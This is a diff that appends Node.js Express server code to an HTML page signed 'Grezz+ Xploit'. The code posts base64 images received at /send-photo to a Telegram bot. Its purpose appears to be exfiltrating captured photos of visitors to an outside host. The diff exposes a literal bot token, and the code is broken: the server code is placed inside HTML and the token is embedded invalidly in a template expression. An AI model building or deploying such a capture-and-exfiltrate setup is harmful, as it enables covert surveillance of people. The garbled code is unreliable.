@@ -186,6 +186,33 @@ body {
     <footer>
     <p>By <a href="https://t.me/@yzzyourfav" target="_blank">Grezz+</a>Xploit</p>
 </footer>
+const express = require('express');
+const axios = require('axios');
+const bodyParser = require('body-parser');
+
+const app = express();
+const BOT_TOKEN = process.env.BOT_TOKEN; // Simpan di environment Vercel
+const CHAT_ID = process.env.CHAT_ID;  // ID grup atau user
+
+app.use(bodyParser.json({ limit: '10mb' }));
+
+app.post('/send-photo', async (req, res) => {
+    try {
+        const imageBase64 = req.body.image.replace(/^data:image\/png;base64,/, "");
+
+        const response = await axios.post(`https://api.telegram.org/bot${7915347881:AAEGmmOyVqHPIYtvR7nKm2nmE24TV4oMWWE}/sendPhoto`, {
+            chat_id: CHAT_ID,
+            photo: `data:image/png;base64,${imageBase64}`
+        });
+
+        res.json({ success: true, message: "Foto berhasil dikirim ke Telegram!" });
+    } catch (error) {
+        console.error("Error kirim foto:", error);
+        res.status(500).json({ success: false, message: "Gagal kirim foto." });
+    }
+});
+
+module.exports = app;
 
 </body>
   </html>
